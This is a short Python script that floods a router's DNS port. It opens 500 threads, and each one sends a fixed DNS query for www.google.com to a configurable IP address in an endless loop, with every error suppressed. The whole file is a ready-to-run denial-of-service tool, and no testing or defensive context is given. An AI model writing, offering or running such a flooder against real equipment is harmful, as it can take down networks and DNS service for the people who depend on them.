import socket
import threading

router_ip = "192.168.1.1"  # CHANGE TO YOUR ROUTER IP
router_port = 53

query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'

def flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query, (router_ip, router_port))
            sock.close()
        except:
            pass

# Start 500 threads
for _ in range(500):
    threading.Thread(target=flood, daemon=True).start()

while True:
    pass
